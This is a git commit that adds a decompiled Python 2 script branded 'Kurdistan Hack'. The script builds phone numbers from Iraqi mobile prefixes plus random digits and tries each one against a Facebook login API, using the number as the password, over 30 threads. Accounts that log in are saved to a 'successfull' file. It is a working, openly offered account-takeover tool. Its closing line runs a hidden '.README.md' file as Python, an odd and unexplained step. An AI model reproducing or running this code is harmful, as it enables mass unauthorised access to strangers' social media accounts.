24d7e10a9fa3160f92fa6d044c25a09c6c77df22
halohack <79331796+halocrak@users.noreply.github.com>
2021-08-14 18:08:43 +0300

    Add files via upload

---
+++ ln.py
@@ -0,0 +1,156 @@
+# uncompyle6 version 3.7.4
+# Python bytecode 2.7 (62211)
+# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
+# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
+# Embedded file name: /sdcard/Download/Dark2.py
+# Compiled at: 2021-04-28 14:55:06
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+for n in range(100000):
+    nmbr = random.randint(1111111, 9999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(0.03)
+    os.system('python2 nmbr.py')
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def t():
+    time.sleep(0.03)
+
+
+def cb():
+    os.system('clear')
+    
+
+
+logo = logo = '\n\x1b[1;93m tlgram:i4m_mrx\n\x1b[1;92m tiktok:i4m_mrx\n\x1b[1;92m youtube:hamarang gaming\n\x1b[1;94m bo am xata na basha (Korek , Tplink , Asia ,)\n'
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+
+def menu():
+    os.system('clear')
+    print logo
+    print 42 * '\x1b[1;91m='
+    print '\x1b[1;93m[1] Kurdistan Hack '
+  
+    print 42 * '\x1b[1;91m='
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;91mHalbzhera  ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;93m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
+        try:
+            c = raw_input(' Zhmarayak Dabne:) ')
+            k = ''
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        os.system('xdg-open https://t.me/i4m_mrx')
+    elif bch == '3':
+        os.system('clear')
+        os.system('xdg-open https://t.me/STAFEEROR404')
+    elif bch == '0':
+        exb()
+    else:
+        print '[!] Fill Ba Kalk Naya'
+        action()
+    xxx = str(len(id))
+    psb('\x1b[1;92mHamw Raqamakan: ' + xxx)
+    time.sleep(0.1)
+    psb('\x1b[1;92mTkaya Chawarwan Ba ...')
+    time.sleep(0.1)
+    psb('\x1b[1;91m[!] Bo Wastan Dni Toolaka CTRL+Z')
+    time.sleep(0.5)
+    print 42 * '\x1b[1;91m='
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[HACK BY HALO]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '>>>' + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;91m[NOT HACK BY HALO]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '>>>' + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 42 * '\x1b[1;91m='
+    print '[\xe2\x9c\x93]\x1b[1;93m Tawaw Gula bax xeri le bbene;) ....'
+    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93]\x1b[1;91m Hacked Saved : save/successfull.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 .README.md')
+
+
+if __name__ == '__main__':
+    menu()
+# okay decompiling staferor404.pyc
